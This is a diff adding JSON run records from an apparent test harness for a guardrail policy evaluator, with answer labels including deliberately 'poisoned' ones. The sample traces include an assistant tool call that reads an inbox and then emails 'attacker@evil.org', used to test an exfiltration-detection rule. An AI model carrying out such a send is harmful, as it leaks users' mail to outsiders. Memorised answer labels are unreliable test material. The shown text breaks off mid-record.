@@ -1,0 +1,1290 @@
+{
+  "schema_version": "IEBV1-run-records-2",
+  "protocol_id": "invariant-external-boundary-v1",
+  "runs": [
+    {
+      "run_id": "readme-message-policy::official_upstream_policy::baseline_public_trace::original",
+      "base_case_id": "readme-message-policy",
+      "policy_id": "upstream-readme-voldemort-message",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "original",
+      "answer_label_payload": {
+        "expected_label": "no_violation_detected"
+      },
+      "answer_label_payload_sha256": "3ff44b2cad37261354cf4a19b47e460573bd7f06a5b86a156555b86ab156cbd5",
+      "score_only_expected_label": "no_violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "11f51a535885a927bdc9e3698cab3d557dd3d914dbc83b05c2e366ce73d85d73",
+      "policy_source": "raise \"The one who must not be named\" if: \n    (msg: Message)\n    \"voldemort\" in msg.content.lower() or \"tom riddle\" in msg.content.lower()\n",
+      "policy_source_sha256": "6a622221e5e17d44e4da1fba970aeb628956f75ccf84587a4eacdd51872d43d6",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Summarize the role of Albus Dumbledore in the story."
+        }
+      ],
+      "public_trace_sha256": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "decision": "no_violation_detected",
+      "error_count": 0,
+      "errors": [],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_sha256_before": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "11f51a535885a927bdc9e3698cab3d557dd3d914dbc83b05c2e366ce73d85d73",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-message-policy::official_upstream_policy::baseline_public_trace::deleted",
+      "base_case_id": "readme-message-policy",
+      "policy_id": "upstream-readme-voldemort-message",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "deleted",
+      "answer_label_payload": {},
+      "answer_label_payload_sha256": "44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a",
+      "score_only_expected_label": "no_violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "11f51a535885a927bdc9e3698cab3d557dd3d914dbc83b05c2e366ce73d85d73",
+      "policy_source": "raise \"The one who must not be named\" if: \n    (msg: Message)\n    \"voldemort\" in msg.content.lower() or \"tom riddle\" in msg.content.lower()\n",
+      "policy_source_sha256": "6a622221e5e17d44e4da1fba970aeb628956f75ccf84587a4eacdd51872d43d6",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Summarize the role of Albus Dumbledore in the story."
+        }
+      ],
+      "public_trace_sha256": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "decision": "no_violation_detected",
+      "error_count": 0,
+      "errors": [],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_sha256_before": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "11f51a535885a927bdc9e3698cab3d557dd3d914dbc83b05c2e366ce73d85d73",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-message-policy::official_upstream_policy::baseline_public_trace::poisoned",
+      "base_case_id": "readme-message-policy",
+      "policy_id": "upstream-readme-voldemort-message",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "poisoned",
+      "answer_label_payload": {
+        "expected_label": "violation_detected"
+      },
+      "answer_label_payload_sha256": "5db95d80426f844d3d94fc3643ca2631374f2d2c408b04c8e5eb1cb6aaeb0df6",
+      "score_only_expected_label": "no_violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "11f51a535885a927bdc9e3698cab3d557dd3d914dbc83b05c2e366ce73d85d73",
+      "policy_source": "raise \"The one who must not be named\" if: \n    (msg: Message)\n    \"voldemort\" in msg.content.lower() or \"tom riddle\" in msg.content.lower()\n",
+      "policy_source_sha256": "6a622221e5e17d44e4da1fba970aeb628956f75ccf84587a4eacdd51872d43d6",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Summarize the role of Albus Dumbledore in the story."
+        }
+      ],
+      "public_trace_sha256": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "decision": "no_violation_detected",
+      "error_count": 0,
+      "errors": [],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_sha256_before": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "11f51a535885a927bdc9e3698cab3d557dd3d914dbc83b05c2e366ce73d85d73",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-message-policy::official_upstream_policy::paired_public_fact_edit::original",
+      "base_case_id": "readme-message-policy",
+      "policy_id": "upstream-readme-voldemort-message",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "paired_public_fact_edit",
+      "public_fact_edit_id": "replace-public-message-with-banned-name",
+      "label_condition": "original",
+      "answer_label_payload": {
+        "expected_label": "violation_detected"
+      },
+      "answer_label_payload_sha256": "5db95d80426f844d3d94fc3643ca2631374f2d2c408b04c8e5eb1cb6aaeb0df6",
+      "score_only_expected_label": "violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "0e90f5c64b504869573229b056274ec4c8a445776ed249884c8a66dcf53d7f7c",
+      "policy_source": "raise \"The one who must not be named\" if: \n    (msg: Message)\n    \"voldemort\" in msg.content.lower() or \"tom riddle\" in msg.content.lower()\n",
+      "policy_source_sha256": "6a622221e5e17d44e4da1fba970aeb628956f75ccf84587a4eacdd51872d43d6",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Summarize the role of Tom Riddle in the story."
+        }
+      ],
+      "public_trace_sha256": "23edc9f8c1615551f6923bdcae32c869982f74ea91bb2be7f6f9c76ee422eb7a",
+      "decision": "violation_detected",
+      "error_count": 1,
+      "errors": [
+        "ErrorInformation(The one who must not be named)"
+      ],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "23edc9f8c1615551f6923bdcae32c869982f74ea91bb2be7f6f9c76ee422eb7a",
+      "public_trace_sha256_before": "23edc9f8c1615551f6923bdcae32c869982f74ea91bb2be7f6f9c76ee422eb7a",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "0e90f5c64b504869573229b056274ec4c8a445776ed249884c8a66dcf53d7f7c",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-message-policy::official_upstream_policy::paired_public_fact_edit::deleted",
+      "base_case_id": "readme-message-policy",
+      "policy_id": "upstream-readme-voldemort-message",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "paired_public_fact_edit",
+      "public_fact_edit_id": "replace-public-message-with-banned-name",
+      "label_condition": "deleted",
+      "answer_label_payload": {},
+      "answer_label_payload_sha256": "44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a",
+      "score_only_expected_label": "violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "0e90f5c64b504869573229b056274ec4c8a445776ed249884c8a66dcf53d7f7c",
+      "policy_source": "raise \"The one who must not be named\" if: \n    (msg: Message)\n    \"voldemort\" in msg.content.lower() or \"tom riddle\" in msg.content.lower()\n",
+      "policy_source_sha256": "6a622221e5e17d44e4da1fba970aeb628956f75ccf84587a4eacdd51872d43d6",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Summarize the role of Tom Riddle in the story."
+        }
+      ],
+      "public_trace_sha256": "23edc9f8c1615551f6923bdcae32c869982f74ea91bb2be7f6f9c76ee422eb7a",
+      "decision": "violation_detected",
+      "error_count": 1,
+      "errors": [
+        "ErrorInformation(The one who must not be named)"
+      ],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "23edc9f8c1615551f6923bdcae32c869982f74ea91bb2be7f6f9c76ee422eb7a",
+      "public_trace_sha256_before": "23edc9f8c1615551f6923bdcae32c869982f74ea91bb2be7f6f9c76ee422eb7a",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "0e90f5c64b504869573229b056274ec4c8a445776ed249884c8a66dcf53d7f7c",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-message-policy::official_upstream_policy::paired_public_fact_edit::poisoned",
+      "base_case_id": "readme-message-policy",
+      "policy_id": "upstream-readme-voldemort-message",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "paired_public_fact_edit",
+      "public_fact_edit_id": "replace-public-message-with-banned-name",
+      "label_condition": "poisoned",
+      "answer_label_payload": {
+        "expected_label": "no_violation_detected"
+      },
+      "answer_label_payload_sha256": "3ff44b2cad37261354cf4a19b47e460573bd7f06a5b86a156555b86ab156cbd5",
+      "score_only_expected_label": "violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "0e90f5c64b504869573229b056274ec4c8a445776ed249884c8a66dcf53d7f7c",
+      "policy_source": "raise \"The one who must not be named\" if: \n    (msg: Message)\n    \"voldemort\" in msg.content.lower() or \"tom riddle\" in msg.content.lower()\n",
+      "policy_source_sha256": "6a622221e5e17d44e4da1fba970aeb628956f75ccf84587a4eacdd51872d43d6",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Summarize the role of Tom Riddle in the story."
+        }
+      ],
+      "public_trace_sha256": "23edc9f8c1615551f6923bdcae32c869982f74ea91bb2be7f6f9c76ee422eb7a",
+      "decision": "violation_detected",
+      "error_count": 1,
+      "errors": [
+        "ErrorInformation(The one who must not be named)"
+      ],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "23edc9f8c1615551f6923bdcae32c869982f74ea91bb2be7f6f9c76ee422eb7a",
+      "public_trace_sha256_before": "23edc9f8c1615551f6923bdcae32c869982f74ea91bb2be7f6f9c76ee422eb7a",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "0e90f5c64b504869573229b056274ec4c8a445776ed249884c8a66dcf53d7f7c",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-message-policy::local_policy_source_mutation::baseline_public_trace::original",
+      "base_case_id": "readme-message-policy",
+      "policy_id": "upstream-readme-voldemort-message",
+      "policy_condition": "local_policy_source_mutation",
+      "policy_mutation_id": "replace-banned-name-predicate-with-baseline-name",
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "original",
+      "answer_label_payload": {
+        "expected_label": "violation_detected"
+      },
+      "answer_label_payload_sha256": "5db95d80426f844d3d94fc3643ca2631374f2d2c408b04c8e5eb1cb6aaeb0df6",
+      "score_only_expected_label": "violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "49ffe3ee68b346e0d5ab05502849942d3dd9f970abb9e915c702aecd8de30865",
+      "policy_source": "raise \"Locally mutated baseline-name policy\" if:\n    (msg: Message)\n    \"albus dumbledore\" in msg.content.lower()\n",
+      "policy_source_sha256": "56709fba5aac3b606161def334adb91f9192f65c5109741afeed7fda9b47534c",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Summarize the role of Albus Dumbledore in the story."
+        }
+      ],
+      "public_trace_sha256": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "decision": "violation_detected",
+      "error_count": 1,
+      "errors": [
+        "ErrorInformation(Locally mutated baseline-name policy)"
+      ],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_sha256_before": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "49ffe3ee68b346e0d5ab05502849942d3dd9f970abb9e915c702aecd8de30865",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-message-policy::local_policy_source_mutation::baseline_public_trace::deleted",
+      "base_case_id": "readme-message-policy",
+      "policy_id": "upstream-readme-voldemort-message",
+      "policy_condition": "local_policy_source_mutation",
+      "policy_mutation_id": "replace-banned-name-predicate-with-baseline-name",
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "deleted",
+      "answer_label_payload": {},
+      "answer_label_payload_sha256": "44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a",
+      "score_only_expected_label": "violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "49ffe3ee68b346e0d5ab05502849942d3dd9f970abb9e915c702aecd8de30865",
+      "policy_source": "raise \"Locally mutated baseline-name policy\" if:\n    (msg: Message)\n    \"albus dumbledore\" in msg.content.lower()\n",
+      "policy_source_sha256": "56709fba5aac3b606161def334adb91f9192f65c5109741afeed7fda9b47534c",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Summarize the role of Albus Dumbledore in the story."
+        }
+      ],
+      "public_trace_sha256": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "decision": "violation_detected",
+      "error_count": 1,
+      "errors": [
+        "ErrorInformation(Locally mutated baseline-name policy)"
+      ],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_sha256_before": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "49ffe3ee68b346e0d5ab05502849942d3dd9f970abb9e915c702aecd8de30865",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-message-policy::local_policy_source_mutation::baseline_public_trace::poisoned",
+      "base_case_id": "readme-message-policy",
+      "policy_id": "upstream-readme-voldemort-message",
+      "policy_condition": "local_policy_source_mutation",
+      "policy_mutation_id": "replace-banned-name-predicate-with-baseline-name",
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "poisoned",
+      "answer_label_payload": {
+        "expected_label": "no_violation_detected"
+      },
+      "answer_label_payload_sha256": "3ff44b2cad37261354cf4a19b47e460573bd7f06a5b86a156555b86ab156cbd5",
+      "score_only_expected_label": "violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "49ffe3ee68b346e0d5ab05502849942d3dd9f970abb9e915c702aecd8de30865",
+      "policy_source": "raise \"Locally mutated baseline-name policy\" if:\n    (msg: Message)\n    \"albus dumbledore\" in msg.content.lower()\n",
+      "policy_source_sha256": "56709fba5aac3b606161def334adb91f9192f65c5109741afeed7fda9b47534c",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Summarize the role of Albus Dumbledore in the story."
+        }
+      ],
+      "public_trace_sha256": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "decision": "violation_detected",
+      "error_count": 1,
+      "errors": [
+        "ErrorInformation(Locally mutated baseline-name policy)"
+      ],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_sha256_before": "2d6b16eceb0ce535fee43a6a9979da8c752a9427632b76c91a040ae0b480a7d5",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "49ffe3ee68b346e0d5ab05502849942d3dd9f970abb9e915c702aecd8de30865",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-tool-chain-policy::official_upstream_policy::baseline_public_trace::original",
+      "base_case_id": "readme-tool-chain-policy",
+      "policy_id": "upstream-readme-external-email",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "original",
+      "answer_label_payload": {
+        "expected_label": "violation_detected"
+      },
+      "answer_label_payload_sha256": "5db95d80426f844d3d94fc3643ca2631374f2d2c408b04c8e5eb1cb6aaeb0df6",
+      "score_only_expected_label": "violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "887c4efc67e8092e8cfde7a82ec2fd1f927b5ce3635bcd7951829db9b4e2038b",
+      "policy_source": "raise \"External email to unknown address\" if:\n    # detect flows between tools\n    (call: ToolCall) -> (call2: ToolCall)\n\n    # check if the first call obtains the user's inbox\n    call is tool:get_inbox\n\n    # second call sends an email to an unknown address\n    call2 is tool:send_email({\n      to: \".*@[^ourcompany.com$].*\"\n    })\n",
+      "policy_source_sha256": "38847d7f409b4e7bc20bdb05bc95cb739f02632090bdaabb6b596b3fc5847d74",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Check the inbox and send the status summary."
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-1",
+              "type": "function",
+              "function": {
+                "name": "get_inbox",
+                "arguments": {}
+              }
+            }
+          ]
+        },
+        {
+          "role": "tool",
+          "tool_call_id": "call-1",
+          "content": "[]"
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-2",
+              "type": "function",
+              "function": {
+                "name": "send_email",
+                "arguments": {
+                  "to": "attacker@evil.org",
+                  "subject": "Status summary"
+                }
+              }
+            }
+          ]
+        }
+      ],
+      "public_trace_sha256": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "decision": "violation_detected",
+      "error_count": 1,
+      "errors": [
+        "ErrorInformation(External email to unknown address)"
+      ],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_sha256_before": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "887c4efc67e8092e8cfde7a82ec2fd1f927b5ce3635bcd7951829db9b4e2038b",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-tool-chain-policy::official_upstream_policy::baseline_public_trace::deleted",
+      "base_case_id": "readme-tool-chain-policy",
+      "policy_id": "upstream-readme-external-email",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "deleted",
+      "answer_label_payload": {},
+      "answer_label_payload_sha256": "44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a",
+      "score_only_expected_label": "violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "887c4efc67e8092e8cfde7a82ec2fd1f927b5ce3635bcd7951829db9b4e2038b",
+      "policy_source": "raise \"External email to unknown address\" if:\n    # detect flows between tools\n    (call: ToolCall) -> (call2: ToolCall)\n\n    # check if the first call obtains the user's inbox\n    call is tool:get_inbox\n\n    # second call sends an email to an unknown address\n    call2 is tool:send_email({\n      to: \".*@[^ourcompany.com$].*\"\n    })\n",
+      "policy_source_sha256": "38847d7f409b4e7bc20bdb05bc95cb739f02632090bdaabb6b596b3fc5847d74",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Check the inbox and send the status summary."
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-1",
+              "type": "function",
+              "function": {
+                "name": "get_inbox",
+                "arguments": {}
+              }
+            }
+          ]
+        },
+        {
+          "role": "tool",
+          "tool_call_id": "call-1",
+          "content": "[]"
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-2",
+              "type": "function",
+              "function": {
+                "name": "send_email",
+                "arguments": {
+                  "to": "attacker@evil.org",
+                  "subject": "Status summary"
+                }
+              }
+            }
+          ]
+        }
+      ],
+      "public_trace_sha256": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "decision": "violation_detected",
+      "error_count": 1,
+      "errors": [
+        "ErrorInformation(External email to unknown address)"
+      ],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_sha256_before": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "887c4efc67e8092e8cfde7a82ec2fd1f927b5ce3635bcd7951829db9b4e2038b",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-tool-chain-policy::official_upstream_policy::baseline_public_trace::poisoned",
+      "base_case_id": "readme-tool-chain-policy",
+      "policy_id": "upstream-readme-external-email",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "poisoned",
+      "answer_label_payload": {
+        "expected_label": "no_violation_detected"
+      },
+      "answer_label_payload_sha256": "3ff44b2cad37261354cf4a19b47e460573bd7f06a5b86a156555b86ab156cbd5",
+      "score_only_expected_label": "violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "887c4efc67e8092e8cfde7a82ec2fd1f927b5ce3635bcd7951829db9b4e2038b",
+      "policy_source": "raise \"External email to unknown address\" if:\n    # detect flows between tools\n    (call: ToolCall) -> (call2: ToolCall)\n\n    # check if the first call obtains the user's inbox\n    call is tool:get_inbox\n\n    # second call sends an email to an unknown address\n    call2 is tool:send_email({\n      to: \".*@[^ourcompany.com$].*\"\n    })\n",
+      "policy_source_sha256": "38847d7f409b4e7bc20bdb05bc95cb739f02632090bdaabb6b596b3fc5847d74",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Check the inbox and send the status summary."
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-1",
+              "type": "function",
+              "function": {
+                "name": "get_inbox",
+                "arguments": {}
+              }
+            }
+          ]
+        },
+        {
+          "role": "tool",
+          "tool_call_id": "call-1",
+          "content": "[]"
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-2",
+              "type": "function",
+              "function": {
+                "name": "send_email",
+                "arguments": {
+                  "to": "attacker@evil.org",
+                  "subject": "Status summary"
+                }
+              }
+            }
+          ]
+        }
+      ],
